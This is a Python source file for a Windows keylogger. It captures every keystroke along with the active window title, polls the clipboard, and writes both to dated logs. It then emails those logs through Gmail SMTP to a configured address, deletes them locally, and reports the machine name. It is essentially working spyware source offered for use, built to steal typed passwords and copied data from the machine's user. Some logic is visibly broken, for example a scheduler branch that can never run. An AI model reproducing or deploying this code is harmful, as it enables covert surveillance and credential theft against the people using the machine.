import os
import sys
import json
import time
import datetime
import smtplib
import ssl
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from threading import Thread, Lock, Event

if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(SCRIPT_DIR, "logs")
CONFIG_PATH = os.path.join(SCRIPT_DIR, "config.json")
STOP_SIGNAL = os.path.join(SCRIPT_DIR, "stop.signal")
os.makedirs(LOG_DIR, exist_ok=True)

# ──────────────────────────────────────────────
# Try imports – graceful exit if missing
# ──────────────────────────────────────────────
try:
    from pynput import keyboard
except ImportError:
    print("Missing pynput. Run: pip install pynput")
    sys.exit(1)

try:
    import pyperclip
except ImportError:
    pyperclip = None

active_window = "Unknown"

# ── Active window detection via pywin32 ──────
try:
    import win32gui

    def get_active_window_title():
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd) or "(no title)"

except ImportError:
    def get_active_window_title():
        return "(window detection unavailable)"

# ── Config loader ────────────────────────────

def load_config():
    if not os.path.exists(CONFIG_PATH):
        return None
    with open(CONFIG_PATH, "r", encoding="utf-8") as f:
        return json.load(f)

# ── Helpers ──────────────────────────────────

def log_path(kind, date=None):
    """Return log file path for the given date (default: today)."""
    if date is None:
        date = datetime.date.today()
    elif isinstance(date, str):
        date = datetime.date.fromisoformat(date)
    return os.path.join(LOG_DIR, f"{date.isoformat()}_{kind}.txt")


def write_log(kind, text):
    """Append a single line to the given log file."""
    path = log_path(kind)
    with open(path, "a", encoding="utf-8") as f:
        f.write(text + "\n")


# ── Email sender ────────────────────────────

def send_logs_for_date(date_str, config):
    """Email yesterday's log files to the configured address, then delete them."""
    keylog = log_path("keylog", date_str)
    clip = log_path("clipboard", date_str)

    files_to_send = [f for f in (keylog, clip) if os.path.exists(f)]
    if not files_to_send:
        return  # nothing to send

    msg = MIMEMultipart()
    msg["From"] = config["email"]
    msg["To"] = config["to"]
    pc_name = os.environ.get("COMPUTERNAME", "UNKNOWN")
    msg["Subject"] = f"{pc_name} - Activity Log - {date_str}"

    body = f"Activity logs for {date_str} are attached."
    msg.attach(MIMEText(body, "plain"))

    for filepath in files_to_send:
        filename = os.path.basename(filepath)
        with open(filepath, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={filename}")
        msg.attach(part)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 465)
        server.starttls()
        server.login(config["email"], config["app_password"])
        server.send_message(msg)
        server.quit()

        # Delete sent files
        for filepath in files_to_send:
            try:
                os.remove(filepath)
            except Exception:
                pass
        return True
    except Exception as e:
        # If email fails, keep files and try again next midnight cycle
        return False


def send_notification(config, date_str, reason="Stopped"):
    """Send a notification email that the tracker was stopped."""
    msg = MIMEMultipart()
    msg["From"] = config["email"]
    msg["To"] = config["to"]
    pc_name = os.environ.get("COMPUTERNAME", "UNKNOWN")
    msg["Subject"] = f"{pc_name} - Tracker {reason} - {date_str}"

    body = f"Tracker was {reason.lower()} on {pc_name} for {date_str}."
    msg.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP("smtp.gmail.com", 465)
        server.starttls()
        server.login(config["email"], config["app_password"])
        server.send_message(msg)
        server.quit()
    except Exception:
        pass


# ── Stop signal handler ─────────────────────

_stop_event = Event()


def check_stop_signal(config):
    """If stop.signal exists, email today's logs then signal shutdown."""
    if os.path.exists(STOP_SIGNAL):
        try:
            os.remove(STOP_SIGNAL)
        except Exception:
            pass
        # Send today's logs
        today_str = datetime.date.today().isoformat()
        sent = send_logs_for_date(today_str, config)
        # Always send a notification email even if no logs exist
        if not sent:
            send_notification(config, today_str, "Stopped")
        _stop_event.set()


def stop_signal_poller(config):
    """Check for stop.signal every 2 seconds (fast response)."""
    while not _stop_event.is_set():
        check_stop_signal(config)
        if not _stop_event.is_set():
            time.sleep(2)


# ── Midnight scheduler ──────────────────────

_last_sent_date = None
_sent_lock = Lock()


def midnight_scheduler(config):
#    """Check every 60 seconds if the day changed; if so, send yesterday's logs."""
    global _last_sent_date
    interval = 300
    
    while not _stop_event.is_set():
        now = datetime.datetime.now()
        #today_str = now.strftime("%Y-%m-%d")
        #yesterday_str = (now - datetime.timedelta(days=1)).strftime("%Y-%m-%d")
        
        with _sent_lock:
            # At or past midnight and we haven't sent today's batch yet
            #if _last_sent_date != today_str and now.hour == 0 and now.minute == 0:
                #send_logs_for_date(yesterday_str, config)
                #_last_sent_date = today_str
            if _last_sent_date is None:
                _last_sent_date = now
                
            elif _last_sent_date is None:
                #_last_sent_date = today_str
                print("1")
                elapsed = (now - _last_sent_date).total_seconds()
                if elapsed >= interval:
                    
                    yesterday_str = (now - datetime.timedelta(days=1)).strftime("%Y-%m-%d")
                    send_logs_for_date(yesterday_str, config)
                    print("successfully!")
                    _last_sent_date = now

        if not _stop_event.is_set():
            #time.sleep(60)
            time.sleep(10)


# ── Keyboard listener ────────────────────────

def on_press(key):
    global active_window
    active_window = get_active_window_title()

    try:
        char = key.char
    except AttributeError:
        # Special keys
        special_map = {
            keyboard.Key.space: "[Space]",
            keyboard.Key.enter: "[Enter]",
            keyboard.Key.tab: "[Tab]",
            keyboard.Key.backspace: "[Backspace]",
            keyboard.Key.shift: "[Shift]",
            keyboard.Key.ctrl_l: "[Ctrl]",
            keyboard.Key.ctrl_r: "[Ctrl]",
            keyboard.Key.alt_l: "[Alt]",
            keyboard.Key.alt_r: "[Alt]",
            keyboard.Key.cmd: "[Win]",
            keyboard.Key.esc: "[Esc]",
            keyboard.Key.delete: "[Del]",
            keyboard.Key.up: "[Up]",
            keyboard.Key.down: "[Down]",
            keyboard.Key.left: "[Left]",
            keyboard.Key.right: "[Right]",
            keyboard.Key.home: "[Home]",
            keyboard.Key.end: "[End]",
            keyboard.Key.page_up: "[PgUp]",
            keyboard.Key.page_down: "[PgDn]",
            keyboard.Key.caps_lock: "[CapsLock]",
            keyboard.Key.num_lock: "[NumLock]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
        }
        char = special_map.get(key, f"[{key.name}]")

    ts = datetime.datetime.now().strftime("%H:%M:%S")
    win = active_window.replace("\\", "\\\\")
    write_log("keylog", f"[{ts}] [{win}] {char}")


# ── Clipboard polling thread ─────────────────

def clipboard_poller(interval=0.5):
    if pyperclip is None:
        return
    seen = ""
    while True:
        try:
            content = pyperclip.paste()
        except Exception:
            content = ""
        if content and content != seen:
            seen = content
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            write_log("clipboard", f"[{ts}] {content}")
        time.sleep(interval)


# ── Main ─────────────────────────────────────

def main():
    config = load_config()

    # Start midnight email scheduler if config is present
    if config:
        Thread(target=midnight_scheduler, args=(config,), daemon=False).start()

        # Start fast stop-signal poller
        Thread(target=stop_signal_poller, args=(config,), daemon=False).start()
        
    # Start clipboard poller in a daemon thread
    Thread(target=clipboard_poller, daemon=True).start()
    
    # Start keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Wait until stop is requested, then shut down
    _stop_event.wait()
    listener.stop()
    listener.join()
    
    # Let the process exit naturally so cleanup.bat can run
    sys.exit(0)


if __name__ == "__main__":
    main()
